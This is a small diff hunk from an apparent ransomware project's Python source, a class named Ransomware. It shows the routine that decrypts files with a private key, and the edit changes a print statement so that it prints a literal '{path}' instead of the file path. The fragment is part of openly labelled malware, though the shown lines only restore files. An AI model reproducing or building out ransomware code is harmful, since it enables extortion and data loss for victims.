@@ -84,7 +84,7 @@ class Ransomware:
                     file.read(len(self.file_tag))
                     clean_data = SealedBox(self.private_key).decrypt(file.read())
             with path.open('wb') as file:
-                print(f"Decrypting file: {path}")
+                print(f"Decrypting file: {{path}}")
                 file.write(clean_data)
                 pass
         except Exception as e:
